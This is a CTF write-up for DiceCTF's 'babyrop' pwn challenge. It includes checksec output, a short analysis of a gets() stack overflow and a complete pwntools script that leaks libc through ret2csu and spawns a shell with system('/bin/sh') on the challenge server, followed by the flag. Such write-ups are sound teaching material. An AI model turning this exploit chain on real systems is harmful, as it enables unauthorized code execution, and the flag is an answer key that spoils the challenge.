# babyrop
author: joshdabosh

"FizzBuzz101: Who wants to write a ret2libc"

`nc dicec.tf 31924`

**Files**: `babyrop`
```sh
$ checksec babyrop
[*] 'babyrop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
## Solving
main() has a simple `write(1, "Your name: ")` introduction, and takes in an infinite input via `gets()`. The challenge expects solvers to use the [ret2csu](https://www.rootnetsec.com/ropemporium-ret2csu/) method to leak libc via `write()`, and considering I _just did that [last week](https://github.com/IRS-Cybersec/ctfdump/tree/master/0x41414141%202021/external)_, doing this again was an exercise in boredom:
```python
from pwnscripts import *
context.binary = 'babyrop'
context.libc_database = '../libc-database'
PAD = 64+8
scratch = context.binary.bss(0x500)

r = remote('dicec.tf', 31924)
context.log_level = 'debug'
R = ROP(context.binary)
R.raw(PAD*b'A')
R.ret2csu(edi=1, rsi=context.binary.got['write'], rdx=6, rbp=scratch)
R.write()
R.write(1,context.binary.got['gets'])
R.main()
r.sendlineafter('Your name: ', R.chain())

libc_leaks = {f:unpack_bytes(r.recv(6),6) for f in ['write', 'gets']}
context.libc = context.libc_database.libc_find(libc_leaks)
R = ROP(context.libc)
R.raw(PAD*b'A')
R.system(context.libc.symbols['str_bin_sh'])
r.sendlineafter('Your name: ', R.chain())
r.interactive()
```
I'm using [a personal patch](https://github.com/152334H/pwntools/) of the [ret2csu branch](https://github.com/Gallopsled/pwntools/pull/1429) of pwntools to have `R.ret2csu()` work automagically. With `write()` working, all you need is libc-database + [pwnscripts](https://github.com/152334H/pwnscripts) to mop up the trivial details regarding returning to libc & calling `system("/bin/sh")`.

## Flag
`dice{so_let's_just_pretend_rop_between_you_and_me_was_never_meant_b1b585695bdd0bcf2d144b4b}`
